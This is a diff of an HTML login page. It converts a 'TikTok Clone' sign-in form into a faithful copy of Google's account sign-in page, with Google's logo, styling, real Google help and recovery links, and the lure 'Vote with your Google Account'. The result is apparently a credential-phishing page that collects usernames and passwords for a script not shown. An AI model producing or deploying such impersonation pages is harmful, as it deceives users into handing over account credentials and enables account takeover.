@@ -1,25 +1,24 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Log in | TikTok</title>
+    <title>Sign in - Google Accounts</title>
     <style>
       :root {
         --bg: #ffffff;
         --surface: #ffffff;
-        --text: #161823;
-        --text-muted: #8a8b91;
-        --border: #e3e4e8;
-        --border-focus: #161823;
-        --primary: #fe2c55;
-        --primary-hover: #e5274c;
-        --primary-soft: rgba(254, 44, 85, 0.08);
-        --error: #fe2c55;
-        --shadow: 0 2px 8px rgba(0, 0, 0, 0.06);
+        --text: #202124;
+        --text-muted: #5f6368;
+        --border: #dadce0;
+        --border-focus: #1a73e8;
+        --primary: #1a73e8;
+        --primary-hover: #1765cc;
+        --primary-soft: rgba(26, 115, 232, 0.08);
+        --error: #d93025;
+        --shadow: 0 1px 3px rgba(0, 0, 0, 0.12);
         --radius: 8px;
-        --radius-lg: 12px;
-        --font: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        --font: 'Google Sans', Roboto, -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
       }
       * { box-sizing: border-box; margin: 0; padding: 0; }
       body {
@@ -36,7 +35,7 @@
       }
       .page {
         width: 100%;
-        max-width: 400px;
+        max-width: 450px;
         display: flex;
         flex-direction: column;
         align-items: center;
@@ -45,37 +44,37 @@
         width: 100%;
         background: var(--surface);
         border: 1px solid var(--border);
-        border-radius: var(--radius-lg);
+        border-radius: var(--radius);
         box-shadow: var(--shadow);
-        padding: 40px 32px 32px;
-        animation: cardIn 0.5s cubic-bezier(0.22, 1, 0.36, 1);
+        padding: 48px 40px 36px;
+        animation: cardIn 0.4s cubic-bezier(0.22, 1, 0.36, 1);
       }
       @keyframes cardIn {
-        from { opacity: 0; transform: translateY(12px); }
+        from { opacity: 0; transform: translateY(8px); }
         to { opacity: 1; transform: translateY(0); }
       }
-      .logo-block { text-align: center; margin-bottom: 28px; }
-      .tiktok-logo { width: 44px; height: 50px; margin-bottom: 12px; }
-      .logo-block h1 { font-size: 22px; font-weight: 700; letter-spacing: -0.2px; }
-      .login-form { display: flex; flex-direction: column; gap: 16px; }
+      .logo-block { text-align: center; margin-bottom: 24px; }
+      .google-logo { width: 116px; height: auto; margin-bottom: 16px; }
+      .logo-block h1 { font-size: 24px; font-weight: 400; color: var(--text); margin-bottom: 8px; }
+      .logo-block p { font-size: 16px; color: var(--text-muted); }
+      .login-form { display: flex; flex-direction: column; gap: 24px; }
       .field { position: relative; }
       .field input {
         width: 100%;
-        height: 52px;
-        padding: 18px 14px 6px;
+        height: 56px;
+        padding: 20px 14px 8px;
         font-size: 16px;
         font-family: var(--font);
         color: var(--text);
-        background: #fafafa;
+        background: #fff;
         border: 1px solid var(--border);
-        border-radius: var(--radius);
+        border-radius: 4px;
         outline: none;
-        transition: border-color 0.2s, background 0.2s, box-shadow 0.2s;
+        transition: border-color 0.2s, box-shadow 0.2s;
       }
       .field input:focus {
-        border-color: var(--border-focus);
-        background: #fff;
-        box-shadow: 0 0 0 3px rgba(22, 24, 35, 0.06);
+        border-color: var(--primary);
+        box-shadow: 0 0 0 1px var(--primary);
       }
       .field label {
         position: absolute;
@@ -85,34 +84,38 @@
         font-size: 16px;
         color: var(--text-muted);
         pointer-events: none;
-        transition: all 0.18s ease;
+        transition: all 0.2s ease;
+        background: #fff;
+        padding: 0 4px;
       }
       .field input:focus + label,
       .field input:not(:placeholder-shown) + label {
-        top: 12px;
+        top: 8px;
         transform: translateY(0);
-        font-size: 11px;
-        font-weight: 600;
-        color: var(--text-muted);
+        font-size: 12px;
+        color: var(--primary);
       }
+      .field input:focus + label { color: var(--primary); }
+      .field input:not(:focus):not(:placeholder-shown) + label { color: var(--text-muted); }
       .toggle-eye {
         position: absolute;
-        right: 10px;
+        right: 12px;
         top: 50%;
         transform: translateY(-50%);
         background: none;
         border: none;
-        padding: 6px;
+        padding: 8px;
         cursor: pointer;
-        color: var(--text-muted);
+        color: var(--primary);
         display: flex;
         align-items: center;
         justify-content: center;
-        border-radius: 6px;
-        transition: color 0.2s, background 0.2s;
+        border-radius: 4px;
+        font-size: 14px;
+        font-weight: 500;
+        transition: background 0.2s;
       }
-      .toggle-eye:hover { color: var(--text); background: rgba(0, 0, 0, 0.05); }
-      .toggle-eye.active { color: var(--primary); }
+      .toggle-eye:hover { background: rgba(26, 115, 232, 0.08); }
       .row-between {
         display: flex;
         align-items: center;
@@ -127,36 +130,36 @@
         color: var(--text);
         user-select: none;
       }
-      .check input { width: 18px; height: 18px; accent-color: var(--primary); cursor: pointer; }
-      .link-muted { color: var(--text-muted); text-decoration: none; font-weight: 600; transition: color 0.2s; }
-      .link-muted:hover { color: var(--text); }
+      .check input { width: 20px; height: 20px; accent-color: var(--primary); cursor: pointer; }
+      .link-primary { color: var(--primary); text-decoration: none; font-weight: 500; transition: opacity 0.2s; }
+      .link-primary:hover { text-decoration: underline; }
       .btn-primary {
         width: 100%;
         height: 48px;
         border: none;
-        border-radius: var(--radius);
+        border-radius: 4px;
         background: var(--primary);
         color: #fff;
-        font-size: 16px;
-        font-weight: 700;
+        font-size: 15px;
+        font-weight: 500;
         font-family: var(--font);
         cursor: pointer;
         transition: background 0.2s, transform 0.1s, box-shadow 0.2s;
-        margin-top: 4px;
+        margin-top: 8px;
       }
       .btn-primary:hover:not(:disabled) {
         background: var(--primary-hover);
-        box-shadow: 0 4px 14px rgba(254, 44, 85, 0.3);
+        box-shadow: 0 1px 3px rgba(0, 0, 0, 0.2);
       }
-      .btn-primary:active:not(:disabled) { transform: scale(0.98); }
+      .btn-primary:active:not(:disabled) { transform: scale(0.99); }
       .btn-primary:disabled { opacity: 0.6; cursor: not-allowed; }
       .error {
-        font-size: 13px;
+        font-size: 14px;
         color: var(--error);
         text-align: center;
-        padding: 8px 12px;
-        background: var(--primary-soft);
-        border-radius: var(--radius);
+        padding: 12px 16px;
+        background: rgba(217, 48, 37, 0.08);
+        border-radius: 4px;
         animation: shake 0.35s;
       }
       @keyframes shake {
@@ -164,77 +167,83 @@
         25% { transform: translateX(-4px); }
         75% { transform: translateX(4px); }
       }
-      .divider {
-        display: flex;
-        align-items: center;
-        gap: 12px;
-        margin: 24px 0;
-        color: var(--text-muted);
-        font-size: 13px;
-        font-weight: 600;
-      }
-      .divider::before, .divider::after {
-        content: "";
-        flex: 1;
-        height: 1px;
-        background: var(--border);
-      }
-      .social-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
-      .social-btn {
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        gap: 8px;
-        height: 44px;
-        border: 1px solid var(--border);
-        border-radius: var(--radius);
-        background: #fff;
-        font-size: 14px;
-        font-weight: 600;
-        font-family: var(--font);
-        color: var(--text);
-        cursor: pointer;
-        transition: border-color 0.2s, background 0.2s, transform 0.1s;
-      }
-      .social-btn:hover { border-color: var(--border-focus); background: #fafafa; }
-      .social-btn:active { transform: scale(0.97); }
-      .signup-text { text-align: center; margin-top: 24px; font-size: 14px; color: var(--text-muted); }
-      .link-accent { color: var(--primary); text-decoration: none; font-weight: 700; margin-left: 4px; }
+      .link-accent { color: var(--primary); text-decoration: none; font-weight: 500; }
       .link-accent:hover { text-decoration: underline; }
+      .row-between-actions {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        margin-top: 24px;
+      }
+      .btn-text {
+        background: none;
+        border: none;
+        color: var(--primary);
+        font-size: 14px;
+        font-weight: 500;
+        font-family: var(--font);
+        cursor: pointer;
+        padding: 8px 12px;
+        border-radius: 4px;
+        transition: background 0.2s;
+      }
+      .btn-text:hover { background: rgba(26, 115, 232, 0.08); }
+      .btn-filled {
+        background: var(--primary);
+        border: none;
+        color: #fff;
+        font-size: 14px;
+        font-weight: 500;
+        font-family: var(--font);
+        cursor: pointer;
+        padding: 8px 24px;
+        border-radius: 4px;
+        transition: background 0.2s, box-shadow 0.2s;
+      }
+      .btn-filled:hover { background: var(--primary-hover); box-shadow: 0 1px 3px rgba(0,0,0,0.2); }
+      .btn-filled:disabled { opacity: 0.6; cursor: not-allowed; }
       .footer {
         width: 100%;
-        max-width: 400px;
+        max-width: 450px;
         margin-top: 32px;
         display: flex;
         flex-direction: column;
         align-items: center;
-        gap: 12px;
+        gap: 16px;
+      }
+      .footer-row {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        width: 100%;
+        font-size: 12px;
+        color: var(--text-muted);
       }
       .lang select {
-        height: 36px;
-        padding: 0 12px;
+        height: 32px;
+        padding: 0 24px 0 12px;
         border: 1px solid var(--border);
-        border-radius: var(--radius);
-        background: #fff;
-        font-size: 14px;
+        border-radius: 4px;
+        background: #fff url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="%235f6368"><path d="M7 10l5 5 5-5z"/></svg>') no-repeat right 8px center;
+        font-size: 13px;
         font-family: var(--font);
         color: var(--text);
         cursor: pointer;
         outline: none;
+        appearance: none;
       }
-      .footer-links { display: flex; gap: 20px; flex-wrap: wrap; justify-content: center; }
+      .footer-links { display: flex; gap: 20px; flex-wrap: wrap; justify-content: flex-end; }
       .footer-links a {
         color: var(--text-muted);
         text-decoration: none;
-        font-size: 13px;
-        font-weight: 600;
+        font-size: 12px;
         transition: color 0.2s;
       }
-      .footer-links a:hover { color: var(--text); }
-      .copyright { font-size: 12px; color: var(--text-muted); }
-      @media (max-width: 420px) {
-        .login-card { padding: 32px 20px 24px; }
-        .social-grid { grid-template-columns: 1fr; }
+      .footer-links a:hover { color: var(--text); text-decoration: underline; }
+      @media (max-width: 480px) {
+        .login-card { padding: 24px 24px 20px; }
+        .footer-row { flex-direction: column; gap: 12px; align-items: flex-start; }
+        .footer-links { justify-content: flex-start; }
       }
     </style>
   </head>
@@ -242,78 +251,55 @@
     <div class="page">
       <div class="login-card">
         <div class="logo-block">
-          <svg class="tiktok-logo" viewBox="0 0 264 296" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
-            <path d="M194.5 0c8.1 22.5 22.8 42.3 43.5 54.5 13 7.7 26.8 12.4 41 14v62c-25-1-48.5-8.6-69.5-22v100c0 48-34.5 87.5-82 87.5-40 0-73-28-81-65.5-1-5-1.5-10-1.5-15.5 0-46 37.5-83.5 83.5-83.5 4.5 0 9 .4 13.5 1v63c-4.5-1.5-9-2-13.5-2-20 0-36 16-36 36s16 36 36 36 36-16 36-36V0h59z" fill="#25F4EE"/>
-            <path d="M185.5 0c8.1 22.5 22.8 42.3 43.5 54.5 13 7.7 26.8 12.4 41 14v62c-25-1-48.5-8.6-69.5-22v100c0 48-34.5 87.5-82 87.5-40 0-73-28-81-65.5 8.5 4 18 6.5 28 6.5 20 0 36-16 36-36V0h84z" fill="#FE2C55"/>
-            <path d="M176.5 0c8.1 22.5 22.8 42.3 43.5 54.5 13 7.7 26.8 12.4 41 14v62c-25-1-48.5-8.6-69.5-22v100c0 48-34.5 87.5-82 87.5-40 0-73-28-81-65.5-1-5-1.5-10-1.5-15.5 0-46 37.5-83.5 83.5-83.5 4.5 0 9 .4 13.5 1v63c-4.5-1.5-9-2-13.5-2-20 0-36 16-36 36s16 36 36 36 36-16 36-36V0h74z" fill="#fff"/>
+          <svg class="google-logo" viewBox="0 0 272 92" xmlns="http://www.w3.org/2000/svg" aria-label="Google" role="img">
+            <path fill="#EA4335" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
+            <path fill="#FBBC05" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
+            <path fill="#4285F4" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/>
+            <path fill="#34A853" d="M225 3v65h-9.5V3h9.5z"/>
+            <path fill="#EA4335" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/>
+            <path fill="#4285F4" d="M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49.01z"/>
           </svg>
-          <h1>Log in to TikTok</h1>
+          <h1>Sign in</h1>
+          <p>Vote with your Google Account</p>
         </div>
         <form class="login-form" id="loginForm" novalidate>
           <div class="field">
             <input type="text" id="usernameInput" autocomplete="username" placeholder=" " required />
-            <label for="usernameInput">Email or username</label>
+            <label for="usernameInput">Email or phone</label>
           </div>
           <div class="field">
             <input type="password" id="passwordInput" autocomplete="current-password" placeholder=" " required />
             <label for="passwordInput">Password</label>
             <button type="button" class="toggle-eye" id="showPasswordBtn" aria-label="Show password" style="display:none">Show</button>
           </div>
-          <div class="row-between">
-            <label class="check">
-              <input type="checkbox" id="remember" />
-              <span>Remember me</span>
-            </label>
-            <a href="#" class="link-muted">Forgot password?</a>
-          </div>
-          <button type="button" class="btn-primary" id="loginBtn" disabled>Log in</button>
           <p class="error" id="error" hidden></p>
+          <a href="https://accounts.google.com/signin/v2/recoveryidentifier" class="link-primary">Forgot password?</a>
         </form>
-        <div class="divider"><span>or</span></div>
-        <div class="social-grid">
-          <a href="https://accounts.google.com/signin" class="social-btn" data-provider="Google" aria-label="Continue with Google">
-            <svg viewBox="0 0 24 24" width="20" height="20"><path fill="#4285F4" d="M22.5 12.2c0-.7-.1-1.4-.2-2H12v3.9h5.9a5 5 0 0 1-2.2 3.3v2.7h3.6c2.1-2 3.2-4.9 3.2-7.9z"/><path fill="#34A853" d="M12 23c2.9 0 5.4-1 7.2-2.6l-3.6-2.7c-1 .7-2.3 1.1-3.6 1.1-2.8 0-5.1-1.9-6-4.4H2.3v2.8A11 11 0 0 0 12 23z"/><path fill="#FBBC05" d="M6 14.4a6.6 6.6 0 0 1 0-4.2V7.4H2.3a11 11 0 0 0 0 9.8L6 14.4z"/><path fill="#EA4335" d="M12 5.4c1.6 0 3 .5 4.1 1.6l3.1-3.1A11 11 0 0 0 2.3 7.4L6 10.2c.9-2.6 3.2-4.8 6-4.8z"/></svg>
-            <span>Google</span>
-          </a>
-          <a href="https://appleid.apple.com/sign-in" class="social-btn" data-provider="Apple" aria-label="Continue with Apple">
-            <svg viewBox="0 0 24 24" width="20" height="20" fill="#000"><path d="M16.4 12.6c0-2 1.6-3 1.7-3.1-1-1.4-2.4-1.6-2.9-1.6-1.2-.1-2.4.7-3 .7-.6 0-1.6-.7-2.6-.7-1.3 0-2.6.8-3.3 2-1.4 2.4-.4 6 1 8 .7 1 1.4 2 2.5 2 1 0 1.4-.6 2.6-.6s1.5.6 2.6.6 1.8-1 2.5-2c.8-1.1 1.1-2.2 1.1-2.3 0 0-2.1-.8-2.1-3.1zM14.4 6.4c.5-.7.9-1.6.8-2.5-.8 0-1.7.5-2.3 1.2-.5.6-.9 1.5-.8 2.4.9.1 1.7-.4 2.3-1.1z"/></svg>
-            <span>Apple</span>
-          </a>
-          <a href="https://www.facebook.com/login" class="social-btn" data-provider="Facebook" aria-label="Continue with Facebook">
-            <svg viewBox="0 0 24 24" width="20" height="20" fill="#1877F2"><path d="M24 12a12 12 0 1 0-13.9 11.9v-8.4H7v-3.5h3.1V9.4c0-3 1.8-4.7 4.6-4.7 1.3 0 2.7.2 2.7.2v3h-1.5c-1.5 0-2 .9-2 1.9v2.2h3.4l-.5 3.5h-2.9v8.4A12 12 0 0 0 24 12z"/></svg>
-            <span>Facebook</span>
-          </a>
-          <a href="https://twitter.com/i/flow/login" class="social-btn" data-provider="X" aria-label="Continue with X">
-            <svg viewBox="0 0 24 24" width="18" height="18" fill="#000"><path d="M18.2 2h3.3l-7.2 8.3L23 22h-6.6l-5.2-6.8L5.4 22H2l7.7-8.8L1.5 2h6.8l4.7 6.2L18.2 2zm-1.2 18h1.8L7.1 3.9H5.2L17 20z"/></svg>
-            <span>X</span>
-          </button>
+        <div class="row-between-actions">
+          <a href="https://accounts.google.com/signup" class="btn-text">Create account</a>
+          <button type="button" class="btn-filled" id="loginBtn" form="loginForm">Next</button>
         </div>
-        <p class="signup-text">
-          Don't have an account?
-          <a href="#" class="link-accent">Sign up</a>
-        </p>
       </div>
       <footer class="footer">
-        <div class="lang">
-          <select aria-label="Language">
-            <option>English</option>
-            <option>Español</option>
-            <option>Français</option>
-            <option>Deutsch</option>
-            <option>日本語</option>
-            <option>中文</option>
-          </select>
+        <div class="footer-row">
+          <div class="lang">
+            <select aria-label="Language">
+              <option>English (United States)</option>
+              <option>Espanol</option>
+              <option>Francais</option>
+              <option>Deutsch</option>
+              <option>___</option>
+              <option>__</option>
+            </select>
+          </div>
+          <div class="footer-links">
+            <a href="https://support.google.com/accounts">Help</a>
+            <a href="https://policies.google.com/privacy">Privacy</a>
+            <a href="https://policies.google.com/terms">Terms</a>
+          </div>
         </div>
-        <div class="footer-links">
-          <a href="#">Help</a>
-          <a href="#">Privacy</a>
-          <a href="#">Terms</a>
-          <a href="#">Contact</a>
-        </div>
-        <span class="copyright">© 2025 TikTok Clone</span>
       </footer>
     </div>
     <script src="script.js" defer></script>
   </body>
-  </html>
-
+</html>
